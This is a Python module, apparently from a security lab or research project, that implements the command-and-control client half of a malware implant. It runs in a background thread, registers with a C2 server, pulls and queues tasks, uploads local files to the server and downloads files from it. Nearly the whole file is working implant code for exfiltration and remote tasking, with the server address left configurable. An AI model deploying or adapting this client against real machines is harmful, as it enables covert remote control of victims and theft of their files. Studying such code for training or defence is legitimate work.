#!/usr/bin/python
#-----------------------------------------------------------------------------
# Name:        c2Client.py [python3]
#
# Purpose:     This module is the client running parellel with the malware's main
#              thread to report to the C2 regular.
#  
# Author:      Yuancheng Liu
#
# Created:     2022/01/09
# version:     v0.2.1
# Copyright:   Copyright (c) 2022 LiuYuancheng
# License:     MIT License
#-----------------------------------------------------------------------------

import os
import time
import requests
import threading

from queue import Queue

DFT_RPT_INV = 10    # defualt report C2 interval

MAX_C2_TASK = 10
MAX_C2_REPORT = 20
ACCEPT_FLG = 'ok'

dirpath = os.path.dirname(__file__)

#-----------------------------------------------------------------------------
#-----------------------------------------------------------------------------
class c2Client(threading.Thread):

    def __init__(self, malwareID, c2Ipaddr, c2Port=5000, ownIP='127.0.0.1') -> None:
        threading.Thread.__init__(self)

        self.id = malwareID
        self.ipaddr = ownIP
        self.c2Ipaddr = c2Ipaddr
        self.c2Port = c2Port
        self.freeFlg = True
        self.connected = False 
        self.urlDict = self._getUrlDict()
        self.c2taskQueue = Queue(maxsize=MAX_C2_TASK)
        self.c2rptQueue = Queue(maxsize=MAX_C2_REPORT)

        self.fileProcessFunction = None 
        self.downloadDir = None 
        self.terminate = False
        self.reportLock = False

        self.c2TaskTemplate = {
            'taskID': 0,
            'taskType': None, 
            'StartT': None,  # None means start immediatly if recevied 
            'repeat': 1,     # how many times to repeat the task.
            'ExPreT': 0,     # time to wait before execution
            'taskData': None
        }

        self.c2reportTemplate = {
            'taskID': 0,
            'finished': False, 
            'Time':  None
        }

        self.c2ReportInterval = DFT_RPT_INV

    #-----------------------------------------------------------------------------
    def _rptMEcheck(self):
        """ Report mutual Exclusion check, this function will make sure the client 
            do task one by one, for example if the client is uploading a file to the C2
            now if the user call the downloadfile() to download a file, the download 
            task will wait untill upload finished.
        """
        while self.reportLock:
            time.sleep(0.01)

    #-----------------------------------------------------------------------------
    def reportToC2(self):
        if self.c2rptQueue.empty(): return None
        reportList = []
        while not self.c2rptQueue.empty():
            reportList.append(self.c2rptQueue.get())
        res = self.reportTohub(action='report', data=reportList)
        return True
        
    #-----------------------------------------------------------------------------
    def _getUrlDict(self):
        return {
            'getFile': "http://%s:%s/filedownload" % (self.c2Ipaddr, str(self.c2Port)),
            'postData': "http://%s:%s/dataPost/" % (self.c2Ipaddr, str(self.c2Port)),
            'postFile': "http://%s:%s/fileupload" % (self.c2Ipaddr, str(self.c2Port))
        }

    #-----------------------------------------------------------------------------
    def run(self):
        print("Start the C2 client.")
        while not self.terminate:
            if self.reportToC2():
                print("Reported the current state to C2")
            else:
                self.getOneC2Task()
            time.sleep(self.c2ReportInterval)

    #-----------------------------------------------------------------------------
    def registerToC2(self):
        print("Register to the C2...")
        res = self.reportTohub(action='register', data={'ipaddr':self.ipaddr})
        if not(res is None) and res['state'] == 'ok':
            self.connected = True
            print("Connected to the C2 server ")
            return True
        return False 

    #-----------------------------------------------------------------------------
    def addNewTask(self, taskDict):
        """ Add the new task to the C2 task queue."""
        c2taskDict = {
            'taskID': 0,
            'taskType': None, 
            'StartT': None,  # None means start immediatly if recevied 
            'repeat': 1,     # how many times to repeat the task.
            'ExPreT': 0,     # time to wait before execution
            'taskData': None
        }
        c2taskDict.update(taskDict)
        if self.c2taskQueue.full(): 
            print("Task queue full, can not add new task from C2")
            return False
        else:
            self.c2taskQueue.put(c2taskDict)

    def getOneC2Task(self):
        return None if self.c2taskQueue.empty() else self.c2taskQueue.get() 

    #-----------------------------------------------------------------------------
    def getTaskFromC2(self):
        """ try to get the task from C2."""
        if self.connected:
            res = self.reportTohub(action='getTask', data=None)
            if res is None: return
            if 'task' in res.keys():
                self.addNewTask(res['task'])

    #-----------------------------------------------------------------------------
    def TransferFiles(self, filePathList, uploadFlg=True):
        if uploadFlg:
            # Check whether C2 allows malware upload files.
            res = self.reportTohub(action='uploadfile', data=filePathList)
            if res is None or res['uploadfile'] != ACCEPT_FLG: return False 
            for filePath in  filePathList:
                self.uploadfile(filePath, dataProcessFun=self.fileProcessFunction)
                time.sleep(0.1) # sleep a short time after the file uploaded.
            return True
        else:
            # Check whether C2 allows malware download files.
            res = self.reportTohub(action='download', data=filePathList)
            if res is None or res['download'] != ACCEPT_FLG: return False 
            for fileName in filePathList:
                self.downloadfile(fileName, 
                                  fileDir=self.downloadDir,
                                  dataProcessFun=self.fileProcessFunction)
                time.sleep(0.1)
            return True

    #-----------------------------------------------------------------------------
    def uploadfile(self, filePath, dataProcessFun=None):
        """ Upload a file which is smaller than the TCP max buffer size."""
        if os.path.exists(filePath):
            try:
                filename = os.path.basename(filePath)
                with open(filePath, 'rb') as fh:
                    filedata = fh.read() if dataProcessFun is None else dataProcessFun(fh.read())
                    uploadUrl = self.urlDict['postFile']
                    dataDict = {'file': (filename, filedata)}
                    res = self._postData(uploadUrl, dataDict, postfile=True)
                    return res
            except Exception as err:
                print("File IO error: %s" % str(err))
                return None
        else:
            print("Upload file : %s not exist" % str(filePath))
            return None

    #-----------------------------------------------------------------------------
    def downloadfile(self, filename, fileDir=None, dataProcessFun=None):
        if fileDir and not os.path.isdir(fileDir): os.mkdir(fileDir)
        filePath = os.path.join(dirpath, filename) if fileDir is None else os.path.join(fileDir, filename)
        uploadUrl = self.urlDict['getFile']
        dataDict = {"filename": filename}
        filedata = self._getData(uploadUrl, dataDict, getFile=True)
        if dataProcessFun: filedata = dataProcessFun(filedata)
        try:
            with open(filePath, 'wb') as fh:
                fh.write(filedata)
        except Exception as err:
            print("download file error : %s" %str(err))
            return None

#-----------------------------------------------------------------------------
    def reportTohub(self, action=None, data=None):
        """ Report to the hub the schduler's inforamtion to register."""
        jsonDict = {
            'id': self.id,
            'free': self.freeFlg,
            'action': action,
            'data': data
        }
        reportUrl = self.urlDict['postData']
        reportUrl += str(jsonDict['id'])
        return self._postData(reportUrl, jsonDict)

    def setFileProcessFunction(self, func):
        self.fileProcessFunction = func

    #-----------------------------------------------------------------------------
    def _getData(self, getUrl, jsonDict, getFile=False):
        self._rptMEcheck()
        try:
            self.reportLock = True 
            res = requests.get(getUrl, json=jsonDict, allow_redirects=True)
            if res.ok:
                self.reportLock = False
                return res.content if getFile else res.json()
        except Exception as err:
            print("http server not reachable, error: %s" %str(err))
            self.connected = False
            self.reportLock = False
            return None
        
    #-----------------------------------------------------------------------------
    def _postData(self, postUrl, jsonDict, postfile=False):
        self._rptMEcheck()
        try:
            self.reportLock = True 
            res = requests.post(postUrl, files=jsonDict) if postfile else requests.post(postUrl, json=jsonDict)
            if res.ok: 
                print("http server reply: %s" %str(res.json()))
                self.reportLock = False
                return res.json()
            else:
                print("post error: %s" % str(res.err))
                self.reportLock = False
                return None
        except Exception as err:
            print("http server not reachable, error: %s" %str(err))
            self.connected = False
            self.reportLock = False
            return None

#-----------------------------------------------------------------------------
#-----------------------------------------------------------------------------
def main():
    client = c2Client('testMalware-0','127.0.0.1', c2Port=5000)
    client.registerToC2()
    #filePath = os.path.join(dirpath, 'update_installer.zip')
    #client.uploadfile(filePath)
    #client.downloadfile('2023-12-13_100327.png')

if __name__ == '__main__':
    main()
